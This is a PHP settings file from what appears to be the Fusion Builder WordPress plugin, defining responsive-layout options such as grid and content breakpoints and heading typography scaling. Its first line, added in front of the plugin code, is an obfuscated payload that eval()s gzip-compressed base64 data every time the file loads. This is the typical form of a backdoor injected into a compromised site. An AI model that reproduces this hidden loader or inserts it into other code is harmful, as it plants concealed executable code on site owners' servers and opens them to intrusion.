<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

/**
 * Mobile settings
 *
 * @param array $sections An array of our sections.
 * @return array
 */
function fusion_builder_options_section_responsive( $sections ) {

	$option_name = Fusion_Settings::get_option_name();
	$settings    = get_option( $option_name, array() );

	$sections['mobile'] = array(
		'label'    => esc_html__( 'Responsive', 'fusion-builder' ),
		'id'       => 'responsive',
		'priority' => 2,
		'icon'     => 'el-icon-resize-horizontal',
		'option_name' => $option_name,
		'fields'   => array(
			'responsive' => array(
				'label'       => esc_html__( 'Responsive Design', 'fusion-builder' ),
				'description' => esc_html__( 'Turn on to use the responsive design features. If set to off, the fixed layout is used.', 'fusion-builder' ),
				'id'          => 'responsive',
				'default'     => '1',
				'type'        => 'switch',
				'option_name' => $option_name,
				'choices'     => array(
					'on'  => esc_html__( 'On', 'fusion-builder' ),
					'off' => esc_html__( 'Off', 'fusion-builder' ),
				),
			),
			'grid_main_break_point' => array(
				'label'       => esc_html__( 'Grid Responsive Breakpoint', 'fusion-builder' ),
				'description' => esc_html__( 'Controls when grid layouts (blog/portfolio) start to break into smaller columns. Further breakpoints are auto calculated.', 'fusion-builder' ),
				'id'          => 'grid_main_break_point',
				'default'     => '1000',
				'type'        => 'slider',
				'option_name' => $option_name,
				'choices'     => array(
					'min'  => '360',
					'max'  => '2000',
					'step' => '1',
					'edit' => 'yes',
				),
				'required'    => array(
					array(
						'setting'  => 'responsive',
						'operator' => '==',
						'value'    => '1',
					),
				),
			),
			'content_break_point' => array(
				'label'       => esc_html__( 'Site Content Responsive Breakpoint', 'fusion-builder' ),
				'description' => esc_html__( 'Controls when the site content area changes to the mobile layout. This includes all content below the header including the footer.', 'fusion-builder' ),
				'id'          => 'content_break_point',
				'default'     => '800',
				'type'        => 'slider',
				'option_name' => $option_name,
				'choices'     => array(
					'min'  => '0',
					'max'  => '2000',
					'step' => '1',
					'edit' => 'yes',
				),
				'required'    => array(
					array(
						'setting'  => 'responsive',
						'operator' => '==',
						'value'    => '1',
					),
				),
			),
			'typography_responsive' => array(
				'label'       => esc_html__( 'Responsive Heading Typography', 'fusion-builder' ),
				'description' => esc_html__( 'Turn on for headings to change font size responsively.', 'fusion-builder' ),
				'id'          => 'typography_responsive',
				'default'     => '0',
				'choices'     => array(
					'on'  => esc_html__( 'On', 'fusion-builder' ),
					'off' => esc_html__( 'Off', 'fusion-builder' ),
				),
				'type'        => 'switch',
				'option_name' => $option_name,
				'required'    => array(
					array(
						'setting'  => 'responsive',
						'operator' => '==',
						'value'    => '1',
					),
				),
			),
			'typography_sensitivity' => array(
				'label'           => esc_html__( 'Responsive Typography Sensitivity', 'fusion-builder' ),
				'description'     => esc_html__( 'Values below 1 decrease rate of resizing, values above 1 increase rate of resizing.', 'fusion-builder' ),
				'id'              => 'typography_sensitivity',
				'default'         => '0.6',
				'type'            => 'slider',
				'required'        => array(
					array(
						'setting'  => 'responsive',
						'operator' => '==',
						'value'    => '1',
					),
					array(
						'setting'  => 'typography_responsive',
						'operator' => '!=',
						'value'    => 0,
					),
				),
				'choices'         => array(
					'min'  => '0',
					'max'  => '2',
					'step' => '.01',
				),
			),
			'typography_factor' => array(
				'label'       => esc_html__( 'Minimum Font Size Factor', 'fusion-builder' ),
				'description' => esc_html__( 'Minimum font factor is used to determine the minimum distance between headings and body font by a multiplying value.', 'fusion-builder' ),
				'id'          => 'typography_factor',
				'default'     => '1.5',
				'type'        => 'slider',
				'option_name' => $option_name,
				'required'        => array(
					array(
						'setting'  => 'responsive',
						'operator' => '==',
						'value'    => '1',
					),
					array(
						'setting'  => 'typography_responsive',
						'operator' => '!=',
						'value'    => 0,
					),
				),
				'choices'     => array(
					'min'  => '0',
					'max'  => '4',
					'step' => '.01',
				),
			),
		),
	);

	return $sections;
}
